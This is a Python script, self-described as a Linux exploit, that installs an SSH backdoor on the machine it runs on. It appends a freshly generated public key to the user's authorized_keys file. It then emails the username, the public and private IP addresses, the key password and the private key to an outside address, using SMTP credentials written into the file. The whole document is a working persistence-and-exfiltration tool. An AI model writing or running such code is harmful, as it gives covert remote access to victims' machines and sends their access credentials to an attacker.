#!/usr/bin/env python3

# This exploit can work only with linux

from os.path import abspath, dirname, isfile, isdir
from os import listdir
import subprocess
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
import random
import string


# SMTP Settings for sending mail
SMTP_SERVER = 'smtp.mailtrap.io'
SMTP_PORT = 2525
SMTP_USER = 'c5c50e55f90cb8'
SMTP_PASSWORD = '7c48e85e1bad05'
DESTINATION_EMAIL = 'destination_email@test.ru'

# Root folder of exploit
ROOT = dirname(abspath(__file__))

USER_NAME = ROOT.split('/')[2]
USER_FOLDER = '/'.join(['', 'home', USER_NAME])

SSH_PATH = f'{USER_FOLDER}/.ssh'
AUTHORIZED_KEYS_FILE_NAME = 'authorized_keys'

PASSWORD_LEN = 16

AUTH_FILE_NAME = "auth.txt"


def send_mail(content: str):
    msg = MIMEText(content)

    msg['Subject'] = ' '.join(['Create ssh key', datetime.now().strftime('%Y-%m-%d %H:%M:%S')])
    msg['From'] = 'Exploit'
    msg['To'] = DESTINATION_EMAIL

    s = smtplib.SMTP(SMTP_SERVER, port=SMTP_PORT)

    s.login(SMTP_USER, SMTP_PASSWORD)
    s.sendmail(msg['From'], [msg['To']], msg.as_string())
    s.quit()


def run(command: str or list) -> dict:
    """Start command in console. Return status and output: {status: True|False, content: stdout|stderr} """
    if command is str:
        command = command.split(' ')

    proc = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if proc.returncode > 0:
        return {'code': False, 'content': proc.stderr.decode()}

    return {'status': True, 'content': proc.stdout.decode()}


def get_public_ip() -> str:
    """Getting ip in internet"""
    return run('curl https://ipinfo.io/ip')['content'].rstrip()


def get_private_ip() -> str:
    """Getting ip in local network"""
    return run('hostname -I')['content'].rstrip()


def get_files_in_folder(path: str) -> list:
    """Return list of files in current folder."""
    return list(filter(lambda file: isfile('/'.join([path, file])), listdir(path)))


def join_paths(dir_: str, files: list) -> list:
    """Join each file with dir."""
    return list(map(lambda file: '/'.join([dir_, file]), files))


def generate_ssh_pair(password: str) -> dict:
    """Generate shh key pair"""
    tmp_prefix = datetime.now().strftime('%Y%m%d%H%M%S')
    run(f'ssh-keygen -t rsa -b 4096 -f {tmp_prefix}_tmp -N {password}')

    with open(f'{tmp_prefix}_tmp', 'r') as private_key_file:
        private_key = private_key_file.read()

    with open(f'{tmp_prefix}_tmp.pub', 'r') as pub_key_file:
        public_key = pub_key_file.read()

    run(f'rm {tmp_prefix}_tmp {tmp_prefix}_tmp.pub')

    return {
        'public': public_key,
        'private': private_key
    }


def generate_password(length: int) -> str:
    """Generate random password by len"""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def main():
    run('sudo apt install openssh-server curl')

    authorized_keys_path = '/'.join([SSH_PATH, AUTHORIZED_KEYS_FILE_NAME])

    if not isdir(SSH_PATH):
        run(f'mkdir {SSH_PATH}')
    else:
        files = get_files_in_folder(SSH_PATH)

        if AUTHORIZED_KEYS_FILE_NAME not in files:
            run(f'su {USER_NAME} -c "touch {authorized_keys_path}"')

    password = generate_password(PASSWORD_LEN)
    key_pair = generate_ssh_pair(password)

    with open(authorized_keys_path, 'a') as keys_file:
        keys_file.write(key_pair['public'])

    run(f'sudo chmod 664 {authorized_keys_path}')

    pub_ip = get_public_ip()
    private_ip = get_private_ip()
    private_key = key_pair['private']

    message = '\n'.join([
        f'Username: {USER_NAME}',
        f'Public IP: {pub_ip}',
        f'Private IP: {private_ip}',
        f'Password: {password}',
        f'Key:\n{private_key}'
    ])

    send_mail(message)


if __name__ == "__main__":
    main()

